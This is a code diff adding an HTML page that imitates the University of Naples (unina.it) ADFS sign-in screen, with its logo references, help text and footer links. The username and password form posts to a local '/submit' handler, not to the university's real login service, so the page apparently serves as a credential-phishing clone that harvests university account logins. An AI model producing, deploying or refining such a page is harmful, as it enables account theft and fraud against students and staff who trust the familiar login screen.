@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en-GB">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1">
+  <meta http-equiv="cache-control" content="no-cache,no-store">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="expires" content="-1">
+  <meta name="mswebdialog-title" content="Connecting to condividi.unina.it">
+
+  <title>Sign In</title>
+
+  <link rel="stylesheet" href="style.css">
+  <script src="script.js" defer></script>
+</head>
+<body dir="ltr" class="body">
+
+  <noscript>
+    <div style="width: 100%; height: 100%; z-index: 100;">
+      <h1>JavaScript required</h1>
+      <p>JavaScript is required. This web browser does not support JavaScript or JavaScript in this web browser is not enabled.</p>
+      <p>To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
+    </div>
+  </noscript>
+
+  <div id="fullPage">
+    <div id="brandingWrapper" class="float">
+      <div id="branding" class="illustrationClass"></div>
+    </div>
+
+    <div id="contentWrapper" class="float">
+      <div id="content">
+        <div id="header">
+          <img class="logoImage" id="companyLogo" src="./logo.jpg" alt="condividi.unina.it">
+        </div>
+
+        <main>
+          <div id="workArea">
+            <div id="authArea" class="groupMargin">
+              <div id="loginArea">
+                <div id="loginMessage" class="groupMargin">Sign in</div>
+
+                <form method="post" id="loginForm" autocomplete="off" novalidate
+                  onkeypress="if (event && event.keyCode == 13) Login.submitLoginRequest();"
+                  action="/submit"
+                  >
+                  <div id="error" class="fieldMargin error smallText" style="display: none;">
+                    <span id="errorText" for="" aria-live="assertive" role="alert"></span>
+                  </div>
+
+                  <div id="formsAuthenticationArea">
+                    <div id="userNameArea">
+                      <label for="userNameInput" class="hidden">User Account</label>
+                      <input id="userNameInput" name="username" type="email"
+                        class="text fullWidth" spellcheck="false"
+                        placeholder="someone@example.com" autocomplete="off">
+                    </div>
+
+                    <div id="passwordArea">
+                      <label for="passwordInput" class="hidden">Password</label>
+                      <input id="passwordInput" name="password" type="password"
+                        class="text fullWidth" placeholder="Password" autocomplete="off">
+                    </div>
+
+                    <div id="kmsiArea" style="display:none">
+                      <input type="checkbox" name="Kmsi" id="kmsiInput" value="true">
+                      <label for="kmsiInput">Keep me signed in</label>
+                    </div>
+
+                    <div id="submissionArea" class="submitMargin">
+                      <span id="submitButton" class="submit" role="button"
+                        onkeypress="if (event && event.keyCode == 32) Login.submitLoginRequest();"
+                        onclick="return Login.submitLoginRequest();">Sign in</span>
+                    </div>
+                  </div>
+
+                  <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication">
+                </form>
+
+                <div id="authOptions">
+                  <form id="options" method="post" action="https://condividi.unina.it/adfs/ls/...">
+                    <input id="optionSelection" type="hidden" name="AuthMethod">
+                    <input name="UserName" type="hidden">
+
+                    <div id="authOptionLinks" class="groupMargin">
+                      <div id="waitingWheelDiv" style="display: none;">
+                        <div id="WaitingWheel">
+                          <div id="floatingCirclesG">
+                            <div class="f_circleG" id="frotateG_01"></div>
+                            <div class="f_circleG" id="frotateG_02"></div>
+                            <div class="f_circleG" id="frotateG_03"></div>
+                            <div class="f_circleG" id="frotateG_04"></div>
+                            <div class="f_circleG" id="frotateG_05"></div>
+                            <div class="f_circleG" id="frotateG_06"></div>
+                            <div class="f_circleG" id="frotateG_07"></div>
+                            <div class="f_circleG" id="frotateG_08"></div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </form>
+                </div>
+
+                <div id="introduction" class="groupMargin">
+                  <p>In caso di mancato accesso verificare di aver messo utente completo di @unina.it o @studenti.unina.it. Leggere ed eseguire attentamente le istruzioni <a href="http://softwaresso.unina.it/office365">qui</a></p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </main>
+
+        <footer id="footer">
+          <div id="footerLinks" class="floatReverse">
+            <div>
+              <span>© 2018 Microsoft</span>
+              <a class="pageLink footerLink" href="https://www.idm.unina.it/UninaPswMngt/">Reset Password</a>
+              <a class="pageLink footerLink" href="http://softwaresso.unina.it/office365">Istruzioni</a>
+            </div>
+          </div>
+        </footer>
+
+      </div>
+    </div>
+  </div>
+</body>
+</html>
